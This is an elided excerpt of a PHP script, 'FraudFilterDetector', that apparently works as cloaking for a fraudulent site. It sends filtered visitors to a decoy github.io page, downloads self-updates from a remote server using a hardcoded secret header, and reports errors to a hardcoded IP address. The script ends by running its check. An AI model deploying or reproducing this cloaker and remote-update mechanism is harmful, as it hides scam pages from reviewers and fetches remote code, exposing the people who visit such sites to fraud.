...
class FraudFilterDetector_1kk00 {
    ...
    function isSignatureValid($sign, $time) {
        $str = '01ad2dd3-c9e2-47ee-b179-12d91253384b.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://andreyandrey1.github.io/andreyandrey1/index.html');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 01ad2dd3-c9e2-47ee-b179-12d91253384b',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 01ad2dd3-c9e2-47ee-b179-12d91253384b';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 01ad2dd3-c9e2-47ee-b179-12d91253384b';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=1kk00&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_1kk00 = new FraudFilterDetector_1kk00();
$fraudFilterDetector_1kk00->check();
